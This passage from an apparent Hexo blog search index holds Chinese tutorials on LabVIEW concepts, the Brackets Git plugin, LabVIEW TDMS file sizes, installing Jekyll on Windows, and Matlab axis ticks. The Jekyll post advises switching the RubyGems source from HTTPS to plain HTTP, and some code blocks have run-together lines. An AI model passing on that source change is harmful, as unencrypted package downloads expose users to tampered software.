title="全局变量"></a>全局变量</h3><p>对于一个多vi的项目而言，如果某个或某些变量需要被两个或多个vi调用时，可以考虑使用<strong>全局变量</strong>。该变量作用域为项目中的所有vi程序，软件启动时，系统为其分配内存空间；软件关闭后，系统释放其内存。</p><p>根据我的编程经验，可以依据以下几种情况考虑是否使用全局变量：</p><ul><li>某变量仅被一个vi调用，无需设定全局变量；</li><li>某变量仅被两个vi调用，而且不会频繁更新，可以通过函数接口传递参数，无需设定全局变量；</li><li>某变量被3个或3个以上vi调用，且vi之间没有函数接口，可以考虑使用全局变量；</li><li>某变量被两个或两个以上的<strong>用户界面</strong>调用，多个界面可能并行执行，必须使用全局变量。</li></ul><p><strong>注意</strong>：全局变量也是以vi形式存在，但是它只有前面板，没有程序框图。此外，多个全局变量可以放置在同一个vi中，我们也推荐这么做，这样可以减少全局vi的个数。如果项目文件较小，全局变量个数较少，完全可以只用一个vi文件存储所有的全局变量；如果项目比较庞大，所需的全局变量较多，可以适当增加全局vi文件个数，但也应该将全局变量归类，相同或相似功能的变量应放在一个vi中。</p><h3 id="属性节点"><a href="#属性节点" class="headerlink" title="属性节点"></a>属性节点</h3><p>学习LabVIEW软件开发<strong>属性节点</strong>也是必须掌握的一个内容。这个词可以分为&quot;属性&quot;和&quot;节点&quot;两部分，对应前面板的所有控件，即使是修饰性控件也有其属性。以数值输入控件为例，其属性配置界面如下图所示：</p><p><img src="/assets/labview/keyWords/properties.png" alt="Labview properties"></p><p>开发人员可以在属性配置界面配置控件的默认属性，该操作适用于无需再次更改的属性。每个控件都有其可修改的属性列表，开发人员可以选择控件本身或其接线端，通过 &quot;右键&rarr;创建&rarr;属性节点&rarr;属性&quot; 创建或查看该控件的属性项。</p><p><img src="/assets/labview/keyWords/node.png" alt="Labview node"></p><p>除属性节点外，LabVIEW中还有大量的&quot;节点&quot;，如&quot;表达式节点&quot;公式节点&quot;反馈节点&quot;调用节点&quot;等。对&quot;属性节点&quot;而言，可以举个简单的例子，以人为例，每个人都可以看做一个节点，人包含&quot;姓名&quot;身高&quot;体重&quot;性别&quot;年龄&quot;等属性，那么属性节点就可以理解为包含多个属性的人。读写&quot;属性节点&quot;就是对该节点的某项属性进行读写操作。</p><h3 id="接线端"><a href="#接线端" class="headerlink" title="接线端"></a>接线端</h3><p>对于前面板上的一个控件而言，它在前面板仅出现一次，但在程序框图中可以多种方式出现，包括<strong>接线端</strong>引用<strong>局部变量</strong>和<strong>属性节点</strong>，但每个控件的<strong>接线端</strong>有且只有一个，其它方式则可以多次出现或不出现<strong>接线端</strong>与我们所说的采集卡的接线端是一个道理，它是程序框图与前面板之间传递参数的桥梁。当我们删除前面板中的某个控件时，其程序框图中的接线端也会随之删除，反之亦然。</p><p><img src="/assets/labview/keyWords/port.png" alt="Labview port"></p><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>上面提到的<strong>引用</strong>也是非常常用的一个功能，它相当于C/C++中的<strong>指针</strong>，通过它可以获取控件的识别标识、修改控件属性等。最重要的一点：当我们把控件A的引用作为函数参数传递至某个函数后，被调函数对该引用的操作直接作用在控件A上，而不再需要回调参数或全局变量的参与，这是非常重要和实用的功能。</p><h3 id="标签-amp-标题"><a href="#标签-amp-标题" class="headerlink" title="标签&amp;标题"></a>标签&amp;标题</h3><p>在前面板中，每个控件都有对应的<strong>标签</strong>和<strong>标题</strong>，两者是有区别的。默认显示的是标签，而且标签和标题的默认值是一样的。在程序框图中，只能显示控件的标签，无法显示其标题。Ctrl+H打开控件的说明信息，其显示的既有标题信息，又有标签信息。通常，标签名称较短，用于程序框图使用；标题可以稍长些，在前面板显示标题可以详细描述控件功能，同时放在帮助信息中方便用户查询。</p><p><img src="/assets/labview/keyWords/tag&title.png" alt="Labview tag&amp;title"></p><p>不同控件的标签和标题都可以相同，但不建议这样做，标签通常是唯一的，唯一指定某一个控件，类似于人的学号。对标题的要求则宽松些，可同可不同。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这里讲述了LabVIEW常用的一些基本概念，其它未提及的常用概念较为简单，或是仅对某些特定控件有意义，这就不多说了。</p>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
          <category> LabVIEW </category>
          
      </categories>
      
      
        <tags>
            
            <tag> labview </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Brackets - Git插件的使用方法</title>
      <link href="2016/05/15/brackets-git/"/>
      <url>2016/05/15/brackets-git/</url>
      
        <content type="html"><![CDATA[<p>Brackets，一款专职做网页设计的开发工具，其插件也是极为丰富，Git自然是少不了的，那么如何安装和使用它呢，我以Windows 10环境为例进行说明。</p><h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><h3 id="打开插件管理器"><a href="#打开插件管理器" class="headerlink" title="打开插件管理器"></a>打开插件管理器</h3><p>在Brackets中，基本上所有的插件都可以从插件管理器(Extension Manager)中安装，该管理器可以从Brackets软件菜单栏File中找到。</p><p>![Extension Manager](/assets/brackets/git/extension manager.png)</p><h3 id="搜素并安装git插件"><a href="#搜素并安装git插件" class="headerlink" title="搜素并安装git插件"></a>搜素并安装git插件</h3><ul><li>打开插件管理器后，选择“Available”选项卡，在搜索框中输入“git”。</li></ul><p>![input git](/assets/brackets/git/input git.png)</p><ul><li>在弹出的列表中找到“Brackets Git”，点击“install”开始安装。</li></ul><p>![install git](/assets/brackets/git/install git.png)</p><ul><li>安装完成后，将提示“Installation successful!”。</li></ul><p>![install success](/assets/brackets/git/install success.png)</p><h3 id="查看Git插件"><a href="#查看Git插件" class="headerlink" title="查看Git插件"></a>查看Git插件</h3><p>安装完成后，可以在插件管理器的“Installed”选项卡中查看已安装的插件。</p><p>![installed extensions](/assets/brackets/git/installed extensions.png)</p><p>此外，如果我们想知道它保存在哪个地方，可以打开文件资源管理器,在路径：</p><pre><code class="cmd">C:\\Users\USER_NAME\AppData\Roaming\Brackets\extensions\user</code></pre><p>下进行查看。这里保存了用户安装的所有插件。</p><p><img src="/assets/brackets/git/extensions.png" alt="extensions"></p><h2 id="界面布局"><a href="#界面布局" class="headerlink" title="界面布局"></a>界面布局</h2><h3 id="整体布局"><a href="#整体布局" class="headerlink" title="整体布局"></a>整体布局</h3><p>在Brackets右侧插件栏中可以找到git图标，点击该图标或使用快捷键<code>Ctrl+ALG+G</code>可以打开或关闭界面下方的git工具。在界面左侧，当有文件被修改并且尚未<code>commit</code>时，文件名前面会出现红色竖杠标记，文件中被修改的地方也会出现相应的标记。此外，在界面左侧，项目文件夹下方有一个下拉选项，显示当前所在的git分支。</p><p>![git layout](/assets/brackets/git/git layout.png)</p><h3 id="工具面板"><a href="#工具面板" class="headerlink" title="工具面板"></a>工具面板</h3><p>git工具面板按区域可分为两大块，上面是控件栏，下面是内容指示。</p><p>![git tools](/assets/brackets/git/git tools.png)</p><p>下面是对各个控件的简要说明：</p><ul><li><img src="/assets/brackets/git/git%20clone.png" class="inline-img">:  初始化/克隆项目</li><li><img src="/assets/brackets/git/git%20commit.png" class="inline-img">： 提交当前更改内容</li><li><img src="/assets/brackets/git/git%20updown.png" class="inline-img">： 跳至上一个/下一个文件修改位置</li><li><img src="/assets/brackets/git/git%20history.png" class="inline-img">： 显示仓库历史提交记录/当前文件历史修改记录</li><li><img src="/assets/brackets/git/git%20refresh.png" class="inline-img">： 刷新仓库内容/更多指令选项</li><li><img src="/assets/brackets/git/git%20tag.png" class="inline-img">： 添加标签</li><li><img src="/assets/brackets/git/git%20push.png" class="inline-img">： 切换远程仓库源/fetch/pull/push</li><li><img src="/assets/brackets/git/git%20settings.png" class="inline-img">： 打开指令窗口/Git Settings界面</li></ul><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="关联Git-GUI"><a href="#关联Git-GUI" class="headerlink" title="关联Git GUI"></a>关联Git GUI</h3><p>Brackets的git插件仅仅是个插件，要使用git进行代码管理，前提是电脑已装有git软件，如Windows的git for Windows，安装方法这里不多说。当我们安装好git软件并配置好环境变量后，默认情况下，Brackets能够自动识别git的安装路径；如果没有识别，可以手动设置，打开Git Settings界面，选择Git configuration选项卡，在“Path to Git executable”输入git的安装路径。</p><p>![git settings](/assets/brackets/git/git setPath.png)</p><h3 id="git-init"><a href="#git-init" class="headerlink" title="git init"></a>git init</h3><p>当我们新建一个仓库，需要使用git进行管理时，首先应该在工程目录下执行<code>git init</code>指令，如果使用git插件，则只需在git工具面板中点击“Init”按钮即可。</p><p>![git init](/assets/brackets/git/git init.png)</p><h3 id="git-remote"><a href="#git-remote" class="headerlink" title="git remote"></a>git remote</h3><p>为了推送代码至远程仓库，可以选择Github、Coding等带有Git管理器的网站，新建项目并复制仓库网址。为了实现:</p><pre><code class="bash">git remote add origin https://git.coding.net/litreily/svg-social.git</code></pre><p>可以在Brackets中打开git工具，点击右侧第一个按钮，选择“Create new remote...”，然后依次输入仓库名称以及网址，确认即可。</p><p>![git remote](/assets/brackets/git/git remote.png)</p><p>![git remote](/assets/brackets/git/git remote add.png)</p><h3 id="git-commit"><a href="#git-commit" class="headerlink" title="git commit"></a>git commit</h3><p>当我们需要提交已修改文件时，可以执行<code>git add File_name</code>/<code>git add .</code>以及<code>git commit</code>。如果使用git插件，可以在git工具中勾选需要提交的文件，然后点击提交按钮，在弹出的界面中输入提交信息，点击确认即可。</p><p>![git commit](/assets/brackets/git/git commit files.png)</p><h3 id="git-push"><a href="#git-push" class="headerlink" title="git push"></a>git push</h3><p>在联网情况下，如果需要将代码推送至远程仓库，需要使用指令<code>git push</code>,如：</p><pre><code class="bash">git push origin master</code></pre><p>如果使用git插件，可以点击推送按钮，首次推送需要填写用户名和密码，即远程仓库对应的用户名和密码。</p><p>![git push](/assets/brackets/git/git push files.png)</p><p>![git push](/assets/brackets/git/git push success.png)</p><h3 id="git-pull-git-fetch"><a href="#git-pull-git-fetch" class="headerlink" title="git pull / git fetch"></a>git pull / git fetch</h3><p>如果用户在远程仓库修改了代码或添加了新的文件，此时可以在本地使用指令<code>git pull</code>获取更新文件，如：</p><pre><code class="bash">git pull origin master</code></pre><p>如果使用git插件，可以点击拉取按钮。</p><p>![git pull](/assets/brackets/git/git pull.png)</p><p>![git pull](/assets/brackets/git/git pull success.png)</p><p>指令<code>git fetch</code>的操作方法类似，辞不赘述。</p><h3 id="git-branch-git-checkout-git-merge"><a href="#git-branch-git-checkout-git-merge" class="headerlink" title="git branch / git checkout / git merge"></a>git branch / git checkout / git merge</h3><p>如果需要创建新的分支、切换分支或是合并分支，我们通常需要使用指令<code>git branch</code>/<code>git checkout</code>/<code>git merge</code>,在Brackets中，可以通过界面右侧的分支选项完成这些操作。</p><p>![git checkout](/assets/brackets/git/git checkout.png)</p><p>![git branch](/assets/brackets/git/git branch.png)</p><h3 id="git-tag"><a href="#git-tag" class="headerlink" title="git tag"></a>git tag</h3><p>如果需要给当前版本添加标签，可以点击标签按钮，输入标签名，点击确定即可，下次推送的时候记得在推送窗口勾选“Send tags”。</p><p>![git new tag](/assets/brackets/git/git new tag.png)</p><h3 id="打开指令窗口"><a href="#打开指令窗口" class="headerlink" title="打开指令窗口"></a>打开指令窗口</h3><p>如果习惯使用敲指令，或是有些指令不得不通过指令窗口才能实现，可以通过git插件打开git bash。</p><p>![git bash](/assets/brackets/git/git bash.png)</p><h3 id="查看历史记录"><a href="#查看历史记录" class="headerlink" title="查看历史记录"></a>查看历史记录</h3><p>查看推送记录：</p><p>![git push history](/assets/brackets/git/git history push.png)</p><p>查看某文件的提交记录：</p><p>![git file history](/assets/brackets/git/git history file.png)</p><h3 id="放弃更改"><a href="#放弃更改" class="headerlink" title="放弃更改"></a>放弃更改</h3><p>如果我们需要放弃某些文件的修改时，可以在git工具的内容显示区域找到该文件，点击“discard changes”。如果想要删除某些刚刚添加但还未提交的文件，同样可以在该区域找到文件，通过点击“Delete file”删除文件。</p><p>![git discard](/assets/brackets/git/git discard.png)</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>git指令丰富，上述并非全部，但是尚且够用，往后更新同步。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> brackets </tag>
            
            <tag> git </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Labview - 手自动存储TDMS文件的区别</title>
      <link href="2016/05/11/DAQ-TDMS/"/>
      <url>2016/05/11/DAQ-TDMS/</url>
      
        <content type="html"><![CDATA[<p>在Labview的软件开发过程中，少不了使用DAQ（Data Acquisition）助手，在使用DAQ助手采集数据时，通常需要存储数据，此时我们可以使用DAQ助手的配置界面设置TDMS（Technical Data Management Streaming）文件路径。而TDMS文件是NI主推的一种二进制记录文件，可以大大减小数据的存储容量。</p><p>为了研究使用DAQ助手自动存储TDMS文件产生的数据大小，我专程写了个测试程序，使用NI MAX创建的模拟采集卡生成模拟正弦波信号，通过测试程序进行采集和存储。</p><h2 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h2><p>程序名称：仿DAQ设计.vi</p><ul><li>前面板</li></ul><p><img src="/assets/labview/saveTdms/panel.png" alt="前面板"></p><ul><li>程序框图</li></ul><p><img src="/assets/labview/saveTdms/codeBlock.png" alt="程序框图"></p><h2 id="程序测试"><a href="#程序测试" class="headerlink" title="程序测试"></a>程序测试</h2><h3 id="采样信息"><a href="#采样信息" class="headerlink" title="采样信息"></a>采样信息</h3><ul><li>模拟采集卡：NI USB-6341</li><li>采样频率：100Hz；</li><li>采样点数：100；</li><li>采样时间：5分钟；</li><li>物理通道：ai0,ai1,ai2;</li></ul><h3 id="采样过程"><a href="#采样过程" class="headerlink" title="采样过程"></a>采样过程</h3><ul><li>程序运行中</li></ul><p><img src="/assets/labview/saveTdms/saveTdms.png" alt="saveTdms"></p><ul><li>程序运行结束</li></ul><p><img src="/assets/labview/saveTdms/saveTdmsEnd.png" alt="saveTdmsEnd"></p><h3 id="采样结果"><a href="#采样结果" class="headerlink" title="采样结果"></a>采样结果</h3><pre><code class="txt">总采样点数：30000*3 = 90000.tdms文件大小：180kB(185,132Bytes)185216(Bytes)/90000 ≈ 2.057956Bytes ≈ 2Bytes.tdms_index文件大小：5.01kB(5132Bytes)</code></pre><p>说明每个采样点对应的存储大小为2Bytes左右。如果使用普通文件（如：.txt/.dat等）存储，一个双精度型数据需要占用8Bytes的空间，对应其文件大小将是tdms文件的4倍左右。</p><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><ol><li><p>如果使用DAQ助手自动存储TDMS文件，它将存储已创建的所有虚拟通道的数据，无法单独存储某一通道的数据。</p></li><li><p>对于同一个采集卡设备，当用户需要连续采集多路通道的电压/电流信号时，因为采集卡的多路通道使用相同的参考时钟源和多路复用器，所以只能使用一个DAQ助手。此外，该设备的所有通道对应的采样频率也必须一致。但如果用户的多路通道不是同一类型，例如：电压和计数值，像这种情况，用户能且只能使用多个DAQ助手。</p></li></ol><h3 id="手动存储TDMS文件"><a href="#手动存储TDMS文件" class="headerlink" title="手动存储TDMS文件"></a>手动存储TDMS文件</h3><p>为了解决<strong>局限性</strong>提到的第2个问题，我尝试手动添加TDMS存储文件，用以替代DAQ自动存储TDMS方式。为此，我修改了部分程序，在保留DAQ自动存储的同时，在获取数据后再次存储。修改部分如下图所示：</p><p><img src="/assets/labview/saveTdms/manualSaveTdms.png" alt="manualSaveTDMS"></p><p>再次运行程序，自动存储的tdms文件大小与上述一致，手动存储的tdms文件大小为:</p><pre><code class="yml">704kB(720,998Bytes) ≈ 90000 * 8.011089 (Bytes) ≈ 90000 * 8 (Bytes)</code></pre><p>可以看出，在手动存储时，每个数据的数据量为8个字节左右，恰好是双精度数据的大小。所以在一般情况下，我们优先考虑DAQ的自动存储功能，如果为了减少数据量使用手动存储方法，即使减少通道数，也未必能达到效果，除非减少后的通道数小等于总通道数的1/4.</p><h3 id="文件属性对比"><a href="#文件属性对比" class="headerlink" title="文件属性对比"></a>文件属性对比</h3><ul><li>自动存储文件的属性</li></ul><p><img src="/assets/labview/saveTdms/autoSaveProperties.png" alt="AutoSaveTdmsProperties"></p><ul><li>手动存储文件的属性</li></ul><p><img src="/assets/labview/saveTdms/manualSaveProperties.png" alt="ManualSaveTdmsProperties"></p><p>通过属性对比可以看出，自动存储文件比手动存储文件多了一些属性值，包括<strong>换算数量</strong><code>NI_Number_Of_Scales</code>、<strong>换算阶数和配置</strong><code>NI_Scale[n]_config</code>以及<strong>换算的启用状态</strong><code>NI_Scaling_Status</code>。为了验证数据存储文件大小不一致是否与这些多出属性有关，我进行了进一步测试，在手动存储过程中设置了tdms文件属性，使其与自动存储文件的属性一致。</p><p><img src="/assets/labview/saveTdms/setTdmsProperties.png" alt="SetTdmsProperties"></p><p>但结果依旧令人失望，文件大小并未因此而减小。理论上肯定有方法减小Tdms文件大小，但我现在还不知晓，路漫漫其修远兮，吾将上下而求索。</p>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
          <category> LabVIEW </category>
          
      </categories>
      
      
        <tags>
            
            <tag> labview </tag>
            
            <tag> tdms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在Windows中安装Jekyll</title>
      <link href="2016/04/15/install-jekyll/"/>
      <url>2016/04/15/install-jekyll/</url>
      
        <content type="html"><![CDATA[<p>本着无聊爱折腾的精神，又鉴于Windows系统的限制，无奈寻觅网上资料千千万，终寻得一卷 **<a href="http://www.madhur.co.in/blog/2011/09/01/runningjekyllwindows.html">奇书</a>**，得偿所愿！</p><h2 id="依赖工具"><a href="#依赖工具" class="headerlink" title="依赖工具"></a>依赖工具</h2><ul><li><a href="http://rubyinstaller.org/downloads/">Ruby &amp; Ruby Development Kit</a></li><li>Jekyll</li><li><a href="http://portablepython.com/wiki/PortablePython2.7.5.1/">Python</a>(可选)</li><li>Pygments(可选)</li></ul><h2 id="搭建Jekyll环境"><a href="#搭建Jekyll环境" class="headerlink" title="搭建Jekyll环境"></a>搭建Jekyll环境</h2><p>在Windows中下载安装所需的依赖包，并配置好对应的环境变量。</p><h3 id="安装Ruby"><a href="#安装Ruby" class="headerlink" title="安装Ruby"></a>安装Ruby</h3><p>由于jekyll采用Ruby开发而得，所以想要使用它就得安装Ruby语言环境。可以从<a href="http://rubyinstaller.org/downloads/">http://rubyinstaller.org/downloads/</a>下载Ruby安装包，推荐选择<code>Ruby 2.2.4</code>。下载后安装在<code>C:\Ruby</code>，当然，路径不是固定的。</p><p><img src="/assets/jekyll/Ruby.png" alt="Ruby"></p><h3 id="下载解压Devkit"><a href="#下载解压Devkit" class="headerlink" title="下载解压Devkit"></a>下载解压Devkit</h3><p>下载Ruby的开发工具DevKit，地址与Ruby的<a href="http://rubyinstaller.org/downloads/">下载地址</a>一致。当然，别忘了根据系统位数选择最新版本的DevKit。至于解压路径，选择<code>C:\devkit</code>即可。</p><p><img src="/assets/jekyll/DevKit.png" alt="Development Kit"></p><h3 id="初始化Devkit"><a href="#初始化Devkit" class="headerlink" title="初始化Devkit"></a>初始化Devkit</h3><p>使用快捷键<code>Win+R</code>输入<code>cmd</code>打开命令窗口，输入以下指令：</p><pre><code class="bash">cd C:\devkitruby dk.rb init</code></pre><p><img src="/assets/jekyll/Ruby-init.png" alt="Ruby-init"></p><p>运行以上指令后，devkit目录下将会多出一个&quot;config.yml&quot;,其内容为：</p><pre><code class="bash"># This configuration file contains the absolute path locations of all# installed Rubies to be enhanced to work with the DevKit. This config# file is generated by the &#39;ruby dk.rb init&#39; step and may be modified# before running the &#39;ruby dk.rb install&#39; step. To include any installed# Rubies that were not automagically discovered, simply add a line below# the triple hyphens with the absolute path to the Ruby root directory.## Example:## ---# - C:/ruby19trunk# - C:/ruby192dev#---- C:/Ruby</code></pre><h3 id="安装Devkit"><a href="#安装Devkit" class="headerlink" title="安装Devkit"></a>安装Devkit</h3><p>确保文件中指示的Ruby与安装好的Ruby路径一致，然后执行以下指令：</p><pre><code class="bash">ruby dk.rb install</code></pre><p>至此，ruby开发环境已配置完成，如果中途出现错误，多半是路径问题或环境变量问题，为以防万一，可以在Windows系统属性中的环境变量中添加ruby路径。</p><p><img src="/assets/jekyll/Ruby-envir.png" alt="Ruby-environment"></p><h3 id="安装Jekyll"><a href="#安装Jekyll" class="headerlink" title="安装Jekyll"></a>安装Jekyll</h3><p>执行以下指令安装jekyll：</p><pre><code class="bash">gem install jekyll</code></pre><p>这一步很有可能会报错，而报错原因基本上出于gem源地址，gem默认源地址为<a href="https://rubygems.org/">https://rubygems.org/</a>，需要修改为<a href="http://rubygems.org/">http://rubygems.org/</a>. 修改指令如下：</p><pre><code class="bash">gem sources -r https://rubygems.orggem sources -a http://rubygems.org</code></pre><p>修改后即可正常完成jekyll的下载安装了。安装完成后，便可使用jekyll了。</p><h3 id="可选操作"><a href="#可选操作" class="headerlink" title="可选操作"></a>可选操作</h3><p>如果需要使用Pygments提供的代码高亮功能，可以安装<a href="http://portablepython.com/wiki/PortablePython2.7.5.1/">Python</a>，配置环境变量。再到<a href="https://pypi.python.org/pypi/setuptools#windows">https://pypi.python.org/</a>下载<code>distribute_setup.py</code>。最后通过执行以下指令进行安装：</p><pre><code class="bash">python distribute_setup.pyeasy_install Pygments</code></pre><p>更加详细的Pygments说明可以参考<a href="http://havee.me/internet/2013-08/support-pygments-in-jekyll.html">这里</a>。好了，一切准备就绪。 Enjoy Yourself!</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> jekyll </tag>
            
            <tag> ruby </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Matlab - 设置坐标尺度</title>
      <link href="2016/04/11/matlab-skill/"/>
      <url>2016/04/11/matlab-skill/</url>
      
        <content type="html"><![CDATA[<p>matlab中，在使用plot绘图时会自动生成带有标尺的坐标系，坐标间距会随屏幕大小自动更改。但有时候由于特殊需求需要修改该间距，此时，我们可以通过set函数进行实现。</p><p>以 <code>y=sin(2*pi*10*t)</code> 为例，在使用matlab默认生成方式时，其仿真结果如下图所示：</p><p><img src="/assets/matlab/setTickBefore.png" alt="setTickBefore"></p><p>代码如下：</p><pre><code class="matlab">clcf=10;               % 信号频率fs=400;             % 采样频率N=fs*0.5;           % 采样点数t=(0:N-1)/fs;       % 时间y=sin(2*pi*f.*t);   % 信号plot(t,y);grid on;  % 绘图xlabel(&#39;时间/t&#39;);     % x轴标题ylabel(&#39;幅值&#39;);       % y轴标题title(&#39;y=sin(2*pi*10*t)&#39;)   % 标题set(gca,&#39;xtick&#39;,0:0.025:t(end));    % 设置x轴标尺set(gca,&#39;ytick&#39;,min(y):0.4:max(y)); % 设置y轴标尺</code></pre><p>修改标尺后得到的波形如下图所示：</p><p><img src="/assets/matlab/setTickAfter.png" alt="setTickAfter"></p>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
          <category> Matlab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
